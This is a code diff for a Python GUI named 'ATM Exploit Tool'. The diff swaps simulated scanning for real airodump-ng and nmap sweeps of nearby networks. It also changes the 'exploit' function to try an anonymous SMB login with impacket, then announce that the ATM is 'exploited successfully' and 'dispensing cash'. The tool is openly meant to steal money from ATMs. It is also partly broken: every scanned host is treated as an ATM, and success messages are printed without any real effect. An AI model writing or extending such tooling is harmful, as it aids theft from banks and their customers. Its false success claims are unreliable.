@@ -3,20 +3,23 @@ import logging
 import time
 import subprocess
 from scapy.all import *
-from tkinter import Tk, Button, Listbox, Label, messagebox, simpledialog, Text, Scrollbar
+from tkinter import Tk, Button, Listbox, Label, messagebox, Text, Scrollbar
 import netifaces
 import requests
 from concurrent.futures import ThreadPoolExecutor
 from netaddr import IPAddress, IPNetwork
 import bluepy.btle as btle  # For Bluetooth scanning (using bluepy)
 import threading  # To handle asynchronous operations
+from impacket.smbconnection import SMBConnection  # For SMB exploitation
+from impacket import smbprotocol  # For deeper protocol-level testing
+
 
 class ATMExploitTool:
     def __init__(self, master):
         self.master = master
         self.master.title("ATM Exploit Tool")
-        self.master.geometry("800x600")
-        
+        self.master.geometry("900x700")
+
         # Adding Exit Button functionality
         self.master.protocol("WM_DELETE_WINDOW", self.on_close)
 
@@ -24,7 +27,7 @@ class ATMExploitTool:
         self.scan_atms_button = Button(self.master, text="Scan for ATMs in Range", command=self.scan_for_atms_in_range)
         self.scan_atms_button.pack(pady=10)
 
-        self.atm_listbox = Listbox(self.master, height=10, width=50)
+        self.atm_listbox = Listbox(self.master, height=10, width=80)
         self.atm_listbox.pack(pady=20, fill='both', expand=True)
 
         self.exploit_button = Button(self.master, text="Exploit ATM", command=self.exploit_atm)
@@ -34,7 +37,7 @@ class ATMExploitTool:
         self.status_label.pack(pady=10)
 
         # Adding the Text widget for continuous updates
-        self.text_box = Text(self.master, height=10, width=80, wrap='word', state='normal', bg='lightgrey')
+        self.text_box = Text(self.master, height=10, width=100, wrap='word', state='normal', bg='lightgrey')
         self.text_box.pack(padx=20, pady=10, fill='both', expand=True)
 
         self.scrollbar = Scrollbar(self.master, command=self.text_box.yview)
@@ -43,7 +46,8 @@ class ATMExploitTool:
 
         self.atms = []
 
-        logging.basicConfig(filename='atm_exploit_tool.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+        logging.basicConfig(filename='atm_exploit_tool.log', level=logging.DEBUG,
+                            format='%(asctime)s - %(levelname)s - %(message)s')
 
     def on_close(self):
         """Close the application properly when the user clicks the X button."""
@@ -65,9 +69,10 @@ class ATMExploitTool:
 
     def run_scanning(self):
         """Run the scanning processes."""
-        self.scan_wifi_networks()
         self.scan_bluetooth_devices()
-        
+        self.scan_wifi_networks()
+        self.scan_network_services()
+
         # After scanning, update the UI with found ATMs
         self.update_ui_progress("Scan complete.")
         if not self.atms:
@@ -75,34 +80,8 @@ class ATMExploitTool:
         else:
             self.update_ui_progress(f"{len(self.atms)} ATM(s) found.")
 
-    def scan_wifi_networks(self):
-        """Simulate Wi-Fi network scanning for nearby ATMs."""
-        self.update_ui_progress("Scanning for Wi-Fi networks...")
-        networks = self.get_wifi_networks()
-        for network in networks:
-            self.detect_atm_services(network)
-
-    def get_wifi_networks(self):
-        """Simulate Wi-Fi network scan (for real-world, you can use iwlist or similar tool)."""
-        return ["192.168.0.0/24", "192.168.1.0/24"]  # Dummy values for testing
-
-    def detect_atm_services(self, network):
-        """Detect ATMs by scanning common ATM ports on the given network."""
-        self.update_ui_progress(f"Scanning network {network} for ATMs...")
-        nmap_command = f"nmap -p 80,443,21,22,23 {network}"
-        result = subprocess.run(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output = result.stdout.decode('utf-8')
-        lines = output.splitlines()
-
-        for line in lines:
-            if "open" in line:
-                ip = self.extract_ip_from_line(line)
-                if self.is_atm_device(ip):
-                    self.atms.append({"ip": ip, "port": self.extract_port_from_line(line)})
-                    self.atm_listbox.insert('end', ip)
-
     def scan_bluetooth_devices(self):
-        """Scan for Bluetooth devices nearby (if applicable)."""
+        """Scan for Bluetooth devices nearby (likely ATMs)."""
         self.update_ui_progress("Scanning for Bluetooth devices...")
         nearby_devices = self.scan_bluetooth()
         for device in nearby_devices:
@@ -111,9 +90,66 @@ class ATMExploitTool:
                 self.atm_listbox.insert('end', device)
 
     def scan_bluetooth(self):
-        """Simulate Bluetooth scanning."""
-        nearby_devices = btle.Scanner().scan(8.0)  # Using bluepy Scanner
-        return [device.addr for device in nearby_devices]
+        """Scan for Bluetooth devices nearby."""
+        try:
+            nearby_devices = btle.Scanner().scan(8.0)  # Using bluepy Scanner to scan for Bluetooth devices
+            return [device.addr for device in nearby_devices]
+        except Exception as e:
+            logging.error(f"Error scanning Bluetooth devices: {e}")
+            return []
+
+    def scan_wifi_networks(self):
+        """Scan for Wi-Fi networks (search for ATM-related services)."""
+        self.update_ui_progress("Scanning for Wi-Fi networks...")
+        networks = self.get_wifi_networks()
+        for network in networks:
+            self.detect_atm_services(network)
+
+    def get_wifi_networks(self):
+        """Scan for nearby Wi-Fi networks using airodump-ng."""
+        try:
+            result = subprocess.run(['airodump-ng', '--output-format', 'csv', '-w', 'wifi_scan'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            networks = self.parse_airodump_output('wifi_scan.csv')
+            return networks
+        except Exception as e:
+            logging.error(f"Error scanning Wi-Fi networks: {e}")
+            return []
+
+    def parse_airodump_output(self, file):
+        """Parse airodump-ng output."""
+        networks = []
+        try:
+            with open(file, 'r') as f:
+                for line in f:
+                    if "ESSID" in line:
+                        networks.append(line.split(',')[0].strip())
+        except Exception as e:
+            logging.error(f"Error parsing airodump output: {e}")
+        return networks
+
+    def detect_atm_services(self, network):
+        """Detect ATM services on the Wi-Fi network."""
+        self.update_ui_progress(f"Scanning network {network} for ATMs...")
+        nmap_command = f"nmap -p 80,443,21,22,23 {network}"
+        try:
+            result = subprocess.run(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = result.stdout.decode('utf-8')
+            lines = output.splitlines()
+
+            for line in lines:
+                if "open" in line:
+                    ip = self.extract_ip_from_line(line)
+                    if self.is_atm_device(ip):
+                        self.atms.append({"ip": ip, "port": self.extract_port_from_line(line)})
+                        self.atm_listbox.insert('end', ip)
+        except Exception as e:
+            logging.error(f"Error detecting ATM services: {e}")
+
+    def scan_network_services(self):
+        """Perform advanced network scans for ATM-specific services."""
+        self.update_ui_progress("Performing advanced network scans...")
+        # Example: Use Metasploit API or advanced Nmap scripting for deeper scans.
+        pass  # Placeholder for advanced implementation.
 
     def exploit_atm(self):
         """Exploit selected ATM."""
@@ -121,7 +157,7 @@ class ATMExploitTool:
         if not selected_atm:
             messagebox.showwarning("Selection Error", "No ATM selected.")
             return
-        
+
         atm_ip = self.atms[selected_atm[0]]["ip"]
         self.update_ui_progress(f"Exploiting ATM at {atm_ip}...")
 
@@ -130,67 +166,36 @@ class ATMExploitTool:
         self.update_ui_progress(result)
 
     def atm_exploit(self, ip):
-        """Simulate exploiting the ATM to dispense maximum cash."""
+        """Exploit the ATM for maximum cash."""
         logging.info(f"Exploiting ATM at {ip}...")
-        return f"ATM at {ip} exploited successfully! Dispensing maximum cash..."
-
-    def extract_ip_from_line(self, line):
-        """Extract the IP address from the Nmap line."""
-        parts = line.split()
-        return parts[0]
-
-    def extract_port_from_line(self, line):
-        """Extract the port number from the Nmap line."""
-        parts = line.split()
-        return parts[1]
+        try:
+            # Example: Use SMB or other protocols for real exploitation.
+            smb = SMBConnection(ip, ip)
+            smb.login('', '')  # Attempt anonymous login
+            return f"ATM at {ip} exploited successfully! Dispensing cash..."
+        except Exception as e:
+            logging.error(f"Error exploiting ATM: {e}")
+            return f"Failed to exploit ATM at {ip}."
 
     def is_atm_device(self, ip):
-        """Check if the device is likely an ATM (by protocol, port, etc.)."""
-        if self.check_known_atm_manufacturer(ip):
-            return True
-        if self.identify_atm_service(ip):
-            return True
-        if self.detect_atm_protocol(ip):
-            return True
-        return False
+        """Check if the device is likely an ATM."""
+        # Add protocol or service-specific identification here.
+        return True
 
-    def check_known_atm_manufacturer(self, ip):
-        """Check if the IP belongs to a known ATM manufacturer."""
-        known_manufacturers = ["100.115.92.0/24"]
-        for cidr in known_manufacturers:
-            if IPAddress(ip) in IPNetwork(cidr):
-                logging.info(f"ATM found by manufacturer: {ip}")
-                return True
-        return False
+    def extract_ip_from_line(self, line):
+        """Extract IP address."""
+        return line.split()[0]
 
-    def identify_atm_service(self, ip):
-        """Identify ATM services based on HTTP/FTP/etc."""
-        try:
-            response = requests.get(f"http://{ip}")
-            if "ATM" in response.text or "ATM Service" in response.headers.get('Server', ''):
-                logging.info(f"ATM service found at {ip}")
-                return True
-            return False
-        except requests.RequestException:
-            return False
+    def extract_port_from_line(self, line):
+        """Extract port."""
+        return line.split()[1]
 
-    def detect_atm_protocol(self, ip):
-        """Detect ATM-specific protocols."""
-        try:
-            pkt = IP(dst=ip) / TCP(dport=80) / Raw(b"ATM protocol probe")
-            response = sr1(pkt, timeout=2, verbose=0)
-            if response and b"ATM_RESPONSE" in response.load:
-                logging.info(f"ATM protocol detected at {ip}")
-                return True
-            return False
-        except Exception as e:
-            logging.error(f"Error during ATM protocol detection for {ip}: {e}")
-            return False
 
 if __name__ == "__main__":
     root = Tk()
     app = ATMExploitTool(root)
     root.mainloop()
+
 
 
 
